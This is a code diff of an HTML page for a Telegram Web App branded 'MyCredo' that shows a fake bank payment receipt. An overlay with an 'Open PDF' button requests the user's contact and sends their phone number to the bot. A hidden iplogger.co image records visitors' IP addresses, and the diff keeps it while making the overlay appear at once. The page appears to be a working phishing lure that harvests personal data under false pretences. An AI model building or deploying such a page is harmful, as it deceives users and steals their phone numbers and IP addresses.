@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html>
 <head>
-        <img src="https://iplogger.co/16pc75">
     <title>MyCredo</title>
+        <img src="https://iplogger.co/16pc75">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css">
     <style>
@@ -13,17 +13,23 @@
         .rounded-lg {
             border-radius: 0.5rem;
         }
+        .h-screen {
+            height: 90vh;
+        }
+        .border-custom {
+            border: 2px solid #ea4c38;
+        }
     </style>
 </head>
-<body>
-    <div class="container mx-auto p-4">
+<body class="h-screen flex flex-col">
+    <div class="container mx-auto p-4 flex-grow flex flex-col">
         <img src="https://i.ibb.co/V2bNfxW/IMG-3413-20240710203726.png" alt="Логотип" class="mx-auto mb-4 w-full h-auto rounded-lg">
-        <div class="bg-white rounded-lg shadow p-6 relative">
+        <div class="bg-white rounded-lg shadow p-6 relative flex-grow flex flex-col justify-between">
             <img id="paymentSlip" src="https://i.ibb.co/YffmwHX/Clean-Shot-2024-07-10-at-20-38-17-2x.png" alt="Платежный документ" class="mx-auto mb-4 w-full h-auto rounded-lg">
-            <div id="overlay" class="absolute inset-0 bg-white bg-opacity-90 flex items-center justify-center hidden rounded-lg">
+            <div id="overlay" class="absolute inset-0 bg-white bg-opacity-90 flex items-center justify-center rounded-lg">
                 <div class="bg-white rounded-lg shadow p-6 text-center">
                     <p class="text-lg mb-4">Для просмотра квитанции в PDF нажмите кнопку ниже:</p>
-                    <button id="shareButton" class="bg-[#ea4c38] hover:bg-[#d13f31] text-red font-bold py-2 px-4 rounded-lg">
+                    <button id="shareButton" class="bg-[#ea4c38] hover:bg-[#d13f31] text-white font-bold py-2 px-4 rounded-lg border-custom">
                         Открыть PDF
                     </button>
                 </div>
@@ -33,31 +39,32 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script>
         Telegram.WebApp.ready();
+        Telegram.WebApp.sendData(JSON.stringify({action: 'web_app_opened'}));
 
-document.addEventListener('DOMContentLoaded', function() {
-    setTimeout(function() {
-        document.getElementById('overlay').classList.remove('hidden');
-    }, 2000);
-    
-    document.getElementById('shareButton').addEventListener('click', function() {
-        Telegram.WebApp.requestContact(function(success) {
-            if (success) {
-                var phoneNumber = Telegram.WebApp.initDataUnsafe.user.phone_number;
-                alert('Готово: ' + phoneNumber);
-                
-                // Отправка номера телефона боту
-                Telegram.WebApp.sendData(JSON.stringify({
-                    action: 'save_phone',
-                    phone: phoneNumber
-                }));
-                
-                document.getElementById('overlay').classList.add('hidden');
-            } else {
-                alert('Не удалось');
-            }
+        document.addEventListener('DOMContentLoaded', function() {
+            setTimeout(function() {
+                document.getElementById('overlay').classList.remove('hidden');
+            }, 700);  // Уменьшено время до появления оверлея
+            
+            document.getElementById('shareButton').addEventListener('click', function() {
+                Telegram.WebApp.requestContact(function(success) {
+                    if (success) {
+                        var phoneNumber = Telegram.WebApp.initDataUnsafe.user.phone_number;
+                        alert('Готово: ' + phoneNumber);
+                        
+                        // Отправка номера телефона боту
+                        Telegram.WebApp.sendData(JSON.stringify({
+                            action: 'save_phone',
+                            phone: phoneNumber
+                        }));
+                        
+                        document.getElementById('overlay').classList.add('hidden');
+                    } else {
+                        alert('Не удалось');
+                    }
+                });
+            });
         });
-    });
-});
     </script>
 </body>
 </html>
